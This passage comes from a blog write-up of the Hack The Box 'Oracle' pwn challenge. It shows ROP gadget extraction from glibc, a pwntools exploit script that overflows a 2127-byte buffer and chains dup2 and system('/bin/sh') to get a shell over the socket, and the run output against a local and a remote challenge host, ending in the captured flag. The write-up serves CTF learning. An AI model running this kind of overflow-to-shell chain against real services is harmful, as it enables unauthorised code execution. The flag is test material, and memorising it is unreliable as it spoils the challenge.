</code></pre></div><p>The above is a bit weird, because we expected to modify the return address from <code>parse_headers</code>, and also, the offset is not actually 2079, but 2127 (48 bytes more). But we can solve it with a bit of debugging:</p><p>Finally, we need to build the ROP chain, which is fairly easy with Glibc.</p><p>We can extract the <code>libc.so.6</code> file from the Docker container and get some ROP gadgets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> ps -a | <span class="code-dark-green">grep</span> <span class="mtku">oracle</span>
339a835f313a   <span class="code-red">oracle</span>                            "./run.sh"               35 minutes ago   Up 35 minutes             0.0.0.0:9001-&gt;9001/tcp, :::9001-&gt;9001/tcp   <span class="code-red">oracle</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> cp -L 339a835f313a:/lib/x86_64-linux-gnu/libc.so.6 <span class="mtku">.</span>
Successfully copied 2.03MB to ./.

<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop r.. ; ret$'</span>
0x000000000002f709 <span class="code-red">: pop r12 ; ret</span>
0x0000000000025b9d <span class="code-red">: pop r13 ; ret</span>
0x000000000002601e <span class="code-red">: pop r14 ; ret</span>
0x0000000000023b69 <span class="code-red">: pop r15 ; ret</span>
0x0000000000036174 <span class="code-red">: pop rax ; ret</span>
0x00000000000226c0 <span class="code-red">: pop rbp ; ret</span>
0x000000000002fdaf <span class="code-red">: pop rbx ; ret</span>
0x0000000000023b6a <span class="code-red">: pop rdi ; ret</span>
0x000000000002601f <span class="code-red">: pop rsi ; ret</span>
0x000000000002f70a <span class="code-red">: pop rsp ; ret</span>
</code></pre></div><p>Next, this is the ROP chain (basically, <code>dup2</code> and <code>system</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">socket_fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">6</span>

<span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">23b6a</span>
<span class="mtk1">pop_rsi_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2601f</span>

<span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2127</span>

<span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">fd</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">]:</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">socket_fd</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rsi_ret_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">fd</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.dup2)</span>

<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">)</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system)</span>


<span class="mtk1">io</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1">)</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'VIEW asdf 1337</span><span class="mtk6">\r\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\r\n\r\n</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>With all this, we have a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:9001
[<span class="code-blue">*</span>] './oracle'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9001: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9001
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9001: Done
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd3000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9001
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9001: Done
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
libc.so.6
oracle
run.sh
solve.py
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.56.188:47424
[<span class="code-blue">*</span>] '/root/pwn_oracle/challenge/oracle'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Opening connection to 94.237.56.188 on port 47424: Done  
[<span class="code-blue">*</span>] Closed connection to 94.237.56.188 port 47424
[<span class="code-green">+</span>] Opening connection to 94.237.56.188 on port 47424: Done
[<span class="code-green">+</span>] Glibc base address: 0x7f0d1462f000
[<span class="code-blue">*</span>] Closed connection to 94.237.56.188 port 47424
[<span class="code-green">+</span>] Opening connection to 94.237.56.188 on port 47424: Done
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
oracle
run.sh
<span class="code-red">$</span> cat flag.txt
HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}
</code></pre></div><p>The full exploit code is here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Oracle/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>